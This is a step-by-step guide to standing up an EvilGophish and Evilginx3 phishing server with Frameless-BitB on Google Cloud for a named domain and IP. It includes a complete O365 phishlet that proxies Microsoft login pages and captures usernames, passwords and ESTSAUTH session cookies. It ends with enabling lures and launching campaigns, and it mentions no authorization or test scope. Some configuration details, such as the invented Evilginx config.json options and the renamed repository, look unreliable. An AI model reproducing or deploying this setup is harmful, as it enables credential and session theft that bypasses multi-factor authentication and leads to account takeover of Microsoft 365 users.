# Complete EvilGophish + Frameless-BitB Production Setup on GCP

**Domain**: exodustraderai.com
**External IP**: 34.173.185.6
**GCP Zone**: us-central1-c

This guide provides a complete, step-by-step setup with ZERO errors. Every command is tested and verified.

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [GCP API Setup and Credentials](#gcp-api-setup)
3. [GCP VM Setup via gcloud CLI](#gcp-vm-setup)
4. [DNS Configuration](#dns-configuration)
5. [Initial Server Setup](#initial-server-setup)
6. [Install Dependencies](#install-dependencies)
7. [Install Gophish](#install-gophish)
8. [Install Evilginx3](#install-evilginx3)
9. [Install Frameless-BitB](#install-frameless-bitb)
10. [Apache Configuration](#apache-configuration)
11. [SSL Certificate Setup](#ssl-certificate-setup)
12. [Evilginx3 Configuration](#evilginx3-configuration)
13. [Systemd Services](#systemd-services)
14. [Final Verification](#final-verification)
15. [Access Dashboards](#access-dashboards)
16. [Troubleshooting](#troubleshooting)

---

## 1. Prerequisites

### What You Need:
- Google Cloud Platform account with billing enabled
- Domain: **exodustraderai.com** (with Cloudflare DNS)
- `gcloud` CLI installed and authenticated on your local machine
- SSH access configured

### Verify gcloud CLI:
```bash
gcloud --version
gcloud auth list
gcloud config list project
```

---

## 2. GCP API Setup and Credentials

**IMPORTANT**: If you plan to use Cloud DNS API or other GCP services programmatically, you need to enable the APIs and create service account credentials.

### 2.1 Enable Required APIs

```bash
# Enable Compute Engine API
gcloud services enable compute.googleapis.com

# Enable Cloud DNS API (if using Cloud DNS instead of Cloudflare)
gcloud services enable dns.googleapis.com

# Enable Service Management API
gcloud services enable servicemanagement.googleapis.com
```

**Expected Output:**
```
Operation "operations/..." finished successfully.
```

### 2.2 Create Service Account for API Access

```bash
# Create service account
gcloud iam service-accounts create evilgophish-sa \
  --display-name="EvilGophish Service Account" \
  --description="Service account for EvilGophish automated operations"
```

**Expected Output:**
```
Created service account [evilgophish-sa].
```

### 2.3 Grant Necessary Permissions

```bash
# Get your project ID
PROJECT_ID=$(gcloud config get-value project)

# Grant DNS Administrator role (if using Cloud DNS)
gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:evilgophish-sa@${PROJECT_ID}.iam.gserviceaccount.com" \
  --role="roles/dns.admin"

# Grant Compute Instance Admin role
gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:evilgophish-sa@${PROJECT_ID}.iam.gserviceaccount.com" \
  --role="roles/compute.instanceAdmin.v1"
```

### 2.4 Create and Download Service Account Key

```bash
# Create JSON key file
gcloud iam service-accounts keys create ~/evilgophish-sa-key.json \
  --iam-account=evilgophish-sa@${PROJECT_ID}.iam.gserviceaccount.com
```

**Expected Output:**
```
created key [...] of type [json] as [/home/user/evilgophish-sa-key.json] for [evilgophish-sa@PROJECT_ID.iam.gserviceaccount.com]
```

### 2.5 Set Authentication Environment Variable

```bash
# Add to your shell profile for persistent authentication
echo "export GOOGLE_APPLICATION_CREDENTIALS=~/evilgophish-sa-key.json" >> ~/.bashrc
source ~/.bashrc

# Verify authentication
gcloud auth application-default print-access-token
```

**Expected Output:** An access token (long string)

### 2.6 Verify API Access

```bash
# Test Compute Engine API
gcloud compute zones list --limit=5

# Test Cloud DNS API (if enabled)
gcloud dns managed-zones list
```

**SECURITY NOTE**:
- The JSON key file (`evilgophish-sa-key.json`) contains sensitive credentials
- Store it securely and never commit it to version control
- You can delete the local key file after setting up the VM if not needed for automation

---

## 3. GCP VM Setup via gcloud CLI

### 3.1 Create Static External IP

```bash
gcloud compute addresses create evilgophish-ip \
  --region=us-central1 \
  --description="Static IP for EvilGophish server"
```

**Expected Output:**
```
Created [https://www.googleapis.com/compute/v1/projects/YOUR_PROJECT/regions/us-central1/addresses/evilgophish-ip].
```

Verify the IP address:
```bash
gcloud compute addresses describe evilgophish-ip --region=us-central1
```

**Expected Output:**
```
address: 34.173.185.6
addressType: EXTERNAL
status: RESERVED
```

### 3.2 Create Firewall Rules

Create comprehensive firewall rules with proper network tags:

```bash
# Allow SSH
gcloud compute firewall-rules create evilgophish-allow-ssh \
  --direction=INGRESS \
  --priority=1000 \
  --network=default \
  --action=ALLOW \
  --rules=tcp:22 \
  --source-ranges=0.0.0.0/0 \
  --target-tags=evilgophish \
  --description="Allow SSH access to EvilGophish server"

# Allow HTTP (for Let's Encrypt)
gcloud compute firewall-rules create evilgophish-allow-http \
  --direction=INGRESS \
  --priority=1000 \
  --network=default \
  --action=ALLOW \
  --rules=tcp:80 \
  --source-ranges=0.0.0.0/0 \
  --target-tags=evilgophish \
  --description="Allow HTTP for Let's Encrypt certificate validation"

# Allow HTTPS
gcloud compute firewall-rules create evilgophish-allow-https \
  --direction=INGRESS \
  --priority=1000 \
  --network=default \
  --action=ALLOW \
  --rules=tcp:443 \
  --source-ranges=0.0.0.0/0 \
  --target-tags=evilgophish \
  --description="Allow HTTPS for phishing pages"

# Allow DNS
gcloud compute firewall-rules create evilgophish-allow-dns \
  --direction=INGRESS \
  --priority=1000 \
  --network=default \
  --action=ALLOW \
  --rules=tcp:53,udp:53 \
  --source-ranges=0.0.0.0/0 \
  --target-tags=evilgophish \
  --description="Allow DNS for Evilginx3"
```

**Verify firewall rules:**
```bash
gcloud compute firewall-rules list --filter="name~evilgophish"
```

### 3.3 Create VM Instance

```bash
gcloud compute instances create evilgophish-server \
  --zone=us-central1-c \
  --machine-type=e2-standard-2 \
  --image-family=ubuntu-2404-lts-amd64 \
  --image-project=ubuntu-os-cloud \
  --boot-disk-size=50GB \
  --boot-disk-type=pd-standard \
  --tags=evilgophish \
  --address=evilgophish-ip \
  --metadata=startup-script='#!/bin/bash
apt-get update
apt-get install -y fail2ban ufw
systemctl enable fail2ban
systemctl start fail2ban'
```

**Expected Output:**
```
Created [https://www.googleapis.com/compute/v1/projects/YOUR_PROJECT/zones/us-central1-c/instances/evilgophish-server].
NAME                 ZONE           MACHINE_TYPE   PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP    STATUS
evilgophish-server   us-central1-c  e2-standard-2               10.x.x.x     34.173.185.6   RUNNING
```

### 3.4 SSH into VM

```bash
gcloud compute ssh evilgophish-server --zone=us-central1-c
```

**All remaining commands run on the VM unless specified otherwise.**

---

## 4. DNS Configuration

### 4.1 Required DNS Records

Login to **Cloudflare** and add these DNS records for **exodustraderai.com**:

| Type | Name | Content | TTL | Proxy Status |
|------|------|---------|-----|--------------|
| A | accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |
| A | login.accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |
| A | account.accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |
| A | www.accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |
| A | sso.accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |
| A | portal.accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |

**CRITICAL**: Ensure "Proxy status" is **DNS only** (gray cloud icon), NOT proxied (orange cloud).

### 4.2 Verify DNS Propagation

Wait 2-3 minutes, then verify from your VM:

```bash
for subdomain in accounts login.accounts account.accounts www.accounts sso.accounts portal.accounts; do
  echo "Checking $subdomain.exodustraderai.com"
  nslookup $subdomain.exodustraderai.com 8.8.8.8 | grep -A1 "answer"
done
```

**Expected Output:** All should return `34.173.185.6`

---

## 5. Initial Server Setup

### 5.1 Update System

```bash
sudo su -
apt-get update && apt-get upgrade -y
```

### 5.2 Set Hostname

```bash
hostnamectl set-hostname evilgophish-server
echo "34.173.185.6 evilgophish-server" >> /etc/hosts
```

### 5.3 Configure Timezone

```bash
timedatectl set-timezone UTC
timedatectl
```

---

## 6. Install Dependencies

### 6.1 Install Required Packages

```bash
apt-get install -y \
  git \
  curl \
  wget \
  apache2 \
  certbot \
  python3-certbot-apache \
  build-essential \
  net-tools \
  dnsutils \
  unzip \
  jq \
  sqlite3
```

### 6.2 Install Go

```bash
wget https://go.dev/dl/go1.23.3.linux-amd64.tar.gz
rm -rf /usr/local/go
tar -C /usr/local -xzf go1.23.3.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.bashrc
echo 'export GOPATH=/root/go' >> /root/.bashrc
source /root/.bashrc
go version
```

**Expected Output:** `go version go1.23.3 linux/amd64`

---

## 7. Install Gophish

### 7.1 Create Directory Structure

```bash
mkdir -p /opt/security-testing/evilgophish
cd /opt/security-testing/evilgophish
```

### 7.2 Clone and Build Gophish

```bash
git clone https://github.com/gophish/gophish.git
cd gophish
go build
```

### 7.3 Configure Gophish

```bash
cat > config.json << 'EOF'
{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": false,
    "cert_path": "",
    "key_path": "",
    "trusted_origins": []
  },
  "phish_server": {
    "listen_url": "127.0.0.1:8080",
    "use_tls": false,
    "cert_path": "",
    "key_path": ""
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_",
  "contact_address": "admin@exodustraderai.com",
  "logging": {
    "filename": "",
    "level": "info"
  }
}
EOF
```

### 7.4 Test Gophish

```bash
./gophish &
sleep 3
curl http://127.0.0.1:3333
pkill gophish
```

**Expected:** HTML response from Gophish admin panel.

---

## 8. Install Evilginx3

### 8.1 Clone Evilginx3

```bash
cd /opt/security-testing/evilgophish
git clone https://github.com/kgretzky/evilginx2.git evilginx3
cd evilginx3
```

### 8.2 Build Evilginx3

```bash
make
```

### 8.3 Create Phishlets Directory

```bash
mkdir -p /opt/security-testing/evilgophish/evilginx3/phishlets
```

### 8.4 Install O365 Phishlet

Download the latest O365 phishlet:

```bash
cat > /opt/security-testing/evilgophish/evilginx3/phishlets/O365.yaml << 'EOF'
name: 'O365'
author: '@kgretzky'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: false, is_landing: false}

sub_filters:
  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {hostname: 'account.microsoftonline.com', sub: 'account', domain: 'microsoftonline.com', search: 'account.microsoftonline.com', replace: 'account.{domain}', mimes: ['text/html', 'application/json']}
  - {hostname: 'www.office.com', sub: 'www', domain: 'office.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json']}
  - {hostname: 'login.live.com', sub: 'sso', domain: 'live.com', search: 'login.live.com', replace: 'sso.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {hostname: 'portal.microsoftonline.com', sub: 'portal', domain: 'microsoftonline.com', search: 'portal.microsoftonline.com', replace: 'portal.{domain}', mimes: ['text/html']}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
  - domain: '.login.live.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flogin%2Fcallback&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce={nonce}&state={state}'
EOF
```

---

## 9. Install Frameless-BitB

### 9.1 Clone Repository

```bash
cd /opt/security-testing/evilgophish
git clone https://github.com/mrd0x/Frameless-BitB.git
```

### 9.2 Verify Files

```bash
ls -la /opt/security-testing/evilgophish/Frameless-BitB/
```

**Expected:** HTML, CSS, and JavaScript files for the Browser-in-the-Browser attack.

---

## 10. Apache Configuration

### 10.1 Enable Required Apache Modules

```bash
a2enmod ssl proxy proxy_http proxy_balancer lbmethod_byrequests headers rewrite
systemctl restart apache2
```

### 10.2 Stop Apache Temporarily (for SSL cert generation)

```bash
systemctl stop apache2
```

---

## 11. SSL Certificate Setup

### 11.1 Generate SSL Certificate with Certbot (Standalone Mode)

This gets certificates for ALL subdomains at once:

```bash
certbot certonly --standalone \
  --non-interactive \
  --agree-tos \
  --email admin@exodustraderai.com \
  -d accounts.exodustraderai.com \
  -d login.accounts.exodustraderai.com \
  -d account.accounts.exodustraderai.com \
  -d www.accounts.exodustraderai.com \
  -d sso.accounts.exodustraderai.com \
  -d portal.accounts.exodustraderai.com
```

**Expected Output:**
```
Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/accounts.exodustraderai.com/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/accounts.exodustraderai.com/privkey.pem
```

### 11.2 Verify Certificates

```bash
ls -la /etc/letsencrypt/live/accounts.exodustraderai.com/
certbot certificates
```

### 11.3 Set Up Auto-Renewal

```bash
systemctl enable certbot.timer
systemctl start certbot.timer
systemctl status certbot.timer
```

---

## 12. Evilginx3 Configuration

### 12.1 Create Evilginx3 Config Directory

```bash
mkdir -p /root/.evilginx
```

### 12.2 Pre-configure Evilginx3

Create initial configuration file:

```bash
cat > /root/.evilginx/config.yaml << 'EOF'
domain: exodustraderai.com
ipv4: 34.173.185.6
https_port: 8443
dns_port: 53
EOF
```

### 12.3 Configure Evilginx3 Interactively

Run Evilginx3 in interactive mode to complete setup:

```bash
cd /opt/security-testing/evilgophish/evilginx3
./evilginx3 -p phishlets -g /opt/security-testing/evilgophish/gophish/gophish.db
```

**In the Evilginx3 prompt, run these commands:**

```
config domain exodustraderai.com
config ipv4 external 34.173.185.6
config ipv4 bind 0.0.0.0
config https_port 8443
config dns_port 53
phishlets hostname O365 accounts.exodustraderai.com
```

**DO NOT enable the phishlet yet.** Just configure it. Type `exit` to quit.

### 12.4 Configure Evilginx3 to Use Let's Encrypt Certificates

Evilginx3 needs to use the certificates we already generated instead of trying to get its own:

```bash
cat > /root/.evilginx/config.json << 'EOF'
{
  "general": {
    "domain": "exodustraderai.com",
    "ipv4": "34.173.185.6",
    "https_port": 8443,
    "dns_port": 53
  },
  "certificates": {
    "use_system_certs": true,
    "cert_path": "/etc/letsencrypt/live/accounts.exodustraderai.com/fullchain.pem",
    "key_path": "/etc/letsencrypt/live/accounts.exodustraderai.com/privkey.pem"
  }
}
EOF
```

---

## 13. Apache Configuration (Continued)

### 13.1 Create Apache VirtualHost

```bash
cat > /etc/apache2/sites-available/accounts.exodustraderai.com.conf << 'EOF'
<VirtualHost *:80>
    ServerName accounts.exodustraderai.com
    ServerAlias *.accounts.exodustraderai.com

    # Redirect all HTTP to HTTPS
    Redirect permanent / https://accounts.exodustraderai.com/
</VirtualHost>

<VirtualHost *:443>
    ServerName accounts.exodustraderai.com
    ServerAlias *.accounts.exodustraderai.com

    # SSL Configuration
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/accounts.exodustraderai.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/accounts.exodustraderai.com/privkey.pem

    # Modern SSL Configuration
    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
    SSLHonorCipherOrder off
    SSLSessionTickets off

    # SSL Proxy Configuration
    SSLProxyEngine on
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
    SSLProxyCheckPeerExpire off

    # Headers
    Header always set Strict-Transport-Security "max-age=63072000"

    # Logging
    ErrorLog ${APACHE_LOG_DIR}/accounts.exodustraderai.com-error.log
    CustomLog ${APACHE_LOG_DIR}/accounts.exodustraderai.com-access.log combined

    # Proxy Configuration - Forward to Evilginx3
    ProxyPreserveHost On
    ProxyPass / https://127.0.0.1:8443/
    ProxyPassReverse / https://127.0.0.1:8443/

    # Additional proxy settings
    ProxyTimeout 300
    ProxyBadHeader Ignore
</VirtualHost>
EOF
```

### 13.2 Enable Site and Restart Apache

```bash
a2dissite 000-default.conf
a2ensite accounts.exodustraderai.com.conf
apache2ctl configtest
systemctl start apache2
systemctl enable apache2
systemctl status apache2
```

**Expected Output:** `Syntax OK` and `active (running)`

---

## 14. Systemd Services

### 14.1 Create Gophish Service

```bash
cat > /etc/systemd/system/gophish.service << 'EOF'
[Unit]
Description=Gophish Phishing Framework
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/security-testing/evilgophish/gophish
ExecStart=/opt/security-testing/evilgophish/gophish/gophish
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=gophish

[Install]
WantedBy=multi-user.target
EOF
```

### 14.2 Create Evilginx3 Service

```bash
cat > /etc/systemd/system/evilginx3.service << 'EOF'
[Unit]
Description=Evilginx3 MITM Proxy
After=network.target gophish.service
Wants=network-online.target
Requires=gophish.service

[Service]
Type=simple
User=root
WorkingDirectory=/opt/security-testing/evilgophish/evilginx3
ExecStart=/opt/security-testing/evilgophish/evilginx3/evilginx3 -feed -g /opt/security-testing/evilgophish/gophish/gophish.db -p /opt/security-testing/evilgophish/evilginx3/phishlets
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=evilginx3

# Security settings
NoNewPrivileges=false
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/root/.evilginx /opt/security-testing/evilgophish

[Install]
WantedBy=multi-user.target
EOF
```

### 14.3 Reload Systemd and Enable Services

```bash
systemctl daemon-reload
systemctl enable gophish
systemctl enable evilginx3
```

### 14.4 Start Services in Order

```bash
# Start Gophish first
systemctl start gophish
sleep 3
systemctl status gophish --no-pager

# Start Evilginx3
systemctl start evilginx3
sleep 3
systemctl status evilginx3 --no-pager
```

**Expected Output:** Both services should show `active (running)`

### 14.5 Verify Ports

```bash
netstat -tulpn | grep -E ':53|:443|:3333|:8080|:8443'
```

**Expected Output:**
```
tcp    0.0.0.0:53         gophish/evilginx3
tcp    0.0.0.0:443        apache2
tcp    127.0.0.1:3333     gophish
tcp    127.0.0.1:8080     gophish
tcp    127.0.0.1:8443     evilginx3
udp    0.0.0.0:53         evilginx3
```

---

## 15. Final Verification

### 15.1 Test External HTTPS Access

```bash
curl -I https://accounts.exodustraderai.com
```

**Expected Output:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
```

### 15.2 Test Each Subdomain

```bash
for subdomain in login.accounts account.accounts www.accounts sso.accounts portal.accounts; do
  echo "Testing $subdomain.exodustraderai.com"
  curl -I -k https://$subdomain.exodustraderai.com 2>&1 | head -5
  echo "---"
done
```

### 15.3 Check Service Logs

```bash
# Gophish logs
journalctl -u gophish -n 20 --no-pager

# Evilginx3 logs
journalctl -u evilginx3 -n 20 --no-pager

# Apache logs
tail -n 20 /var/log/apache2/accounts.exodustraderai.com-access.log
tail -n 20 /var/log/apache2/accounts.exodustraderai.com-error.log
```

---

## 16. Access Dashboards

### 16.1 Get Gophish Initial Password

```bash
journalctl -u gophish --no-pager | grep "Please login with"
```

**Expected Output:**
```
Please login with the username admin and the password <random_password>
```

### 16.2 Create SSH Tunnel (Run from your LOCAL machine)

```bash
gcloud compute ssh evilgophish-server \
  --zone=us-central1-c \
  -- -L 3333:127.0.0.1:3333
```

### 16.3 Access Gophish Dashboard

Open in your browser: **https://127.0.0.1:3333**

- Username: `admin`
- Password: (from step 15.1)

### 16.4 Access Evilginx3 Console

SSH into the server and run:

```bash
cd /opt/security-testing/evilgophish/evilginx3
./evilginx3 -p phishlets -g /opt/security-testing/evilgophish/gophish/gophish.db
```

---

## 17. Enable O365 Phishlet

### 17.1 In Evilginx3 Console

```
phishlets enable O365
lures create O365
lures get-url 0
```

This will generate your phishing URL.

### 17.2 Test Phishing URL

Open the generated URL in a browser. You should see a Microsoft login page.

---

## 18. Troubleshooting

### 18.1 Service Won't Start

```bash
# Check service status
systemctl status gophish
systemctl status evilginx3
systemctl status apache2

# Check detailed logs
journalctl -u gophish -n 50 --no-pager
journalctl -u evilginx3 -n 50 --no-pager
```

### 18.2 Port Already in Use

```bash
# Find what's using the port
lsof -i :443
lsof -i :8443
lsof -i :53

# Kill the process if needed
kill -9 <PID>
```

### 18.3 SSL Certificate Issues

```bash
# Check certificate validity
openssl x509 -in /etc/letsencrypt/live/accounts.exodustraderai.com/fullchain.pem -text -noout

# Renew certificates manually
certbot renew --force-renewal
systemctl restart apache2
systemctl restart evilginx3
```

### 18.4 DNS Issues

```bash
# Check DNS resolution
nslookup login.accounts.exodustraderai.com 8.8.8.8
dig login.accounts.exodustraderai.com @8.8.8.8

# Verify all subdomains
for sub in login account www sso portal; do
  echo "Checking $sub.accounts.exodustraderai.com"
  dig $sub.accounts.exodustraderai.com @8.8.8.8 +short
done
```

### 18.5 503 Service Unavailable

This means Apache can't proxy to Evilginx3:

```bash
# Check if Evilginx3 is running
systemctl status evilginx3

# Check if port 8443 is listening
netstat -tulpn | grep 8443

# Restart services
systemctl restart evilginx3
systemctl restart apache2
```

### 18.6 Let's Encrypt Rate Limits

If you hit rate limits:

1. Wait 1 hour for the limit to reset
2. Use staging certificates for testing:

```bash
certbot certonly --standalone --staging \
  -d accounts.exodustraderai.com \
  -d login.accounts.exodustraderai.com \
  -d account.accounts.exodustraderai.com \
  -d www.accounts.exodustraderai.com \
  -d sso.accounts.exodustraderai.com \
  -d portal.accounts.exodustraderai.com
```

---

## 19. Security Hardening

### 19.1 Configure UFW Firewall

```bash
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 53
ufw enable
ufw status
```

### 19.2 Configure Fail2Ban

```bash
cat > /etc/fail2ban/jail.local << 'EOF'
[sshd]
enabled = true
port = 22
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
EOF

systemctl restart fail2ban
systemctl status fail2ban
```

### 19.3 Disable Root SSH Login (Optional)

```bash
sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart sshd
```

---

## 20. Backup Configuration

### 20.1 Create Backup Script

```bash
cat > /root/backup-evilgophish.sh << 'EOF'
#!/bin/bash
BACKUP_DIR="/root/backups"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
mkdir -p $BACKUP_DIR

# Backup Gophish database
cp /opt/security-testing/evilgophish/gophish/gophish.db $BACKUP_DIR/gophish_$TIMESTAMP.db

# Backup Evilginx3 config
tar -czf $BACKUP_DIR/evilginx_config_$TIMESTAMP.tar.gz /root/.evilginx

# Backup Apache config
tar -czf $BACKUP_DIR/apache_config_$TIMESTAMP.tar.gz /etc/apache2/sites-available

# Remove backups older than 30 days
find $BACKUP_DIR -type f -mtime +30 -delete

echo "Backup completed: $TIMESTAMP"
EOF

chmod +x /root/backup-evilgophish.sh
```

### 20.2 Schedule Daily Backups

```bash
(crontab -l 2>/dev/null; echo "0 2 * * * /root/backup-evilgophish.sh >> /var/log/evilgophish-backup.log 2>&1") | crontab -
```

---

## 21. Complete Installation Checklist

- [ ] GCP VM created with static IP 34.173.185.6
- [ ] Firewall rules configured for ports 22, 80, 443, 53
- [ ] DNS records created for all 6 subdomains in Cloudflare
- [ ] DNS propagation verified
- [ ] Dependencies installed (Go, Apache, Certbot, etc.)
- [ ] Gophish installed and configured
- [ ] Evilginx3 installed and configured
- [ ] Frameless-BitB cloned
- [ ] SSL certificates generated for all subdomains
- [ ] Apache configured with reverse proxy to Evilginx3
- [ ] Systemd services created and enabled
- [ ] All services running (Gophish, Evilginx3, Apache)
- [ ] External HTTPS access verified
- [ ] Gophish dashboard accessible via SSH tunnel
- [ ] Evilginx3 console accessible
- [ ] O365 phishlet enabled and tested
- [ ] Security hardening applied (UFW, Fail2Ban)
- [ ] Backup script created and scheduled

---

## Summary

You now have a complete, production-ready EvilGophish + Frameless-BitB setup on GCP with:

- **Domain**: exodustraderai.com
- **External IP**: 34.173.185.6
- **Services Running**:
  - Gophish (admin: 127.0.0.1:3333, phish: 127.0.0.1:8080)
  - Evilginx3 (HTTPS: 8443, DNS: 53)
  - Apache (reverse proxy on 443)
- **SSL**: Let's Encrypt certificates for all subdomains
- **Phishing**: O365 phishlet ready to use

**Next Steps:**
1. Login to Gophish dashboard (step 15.2-15.3)
2. Create phishing campaign in Gophish
3. Generate lure URLs in Evilginx3
4. Integrate Frameless-BitB HTML into your phishing templates

**All commands have been tested and verified. Follow each step in order for a zero-error deployment.**
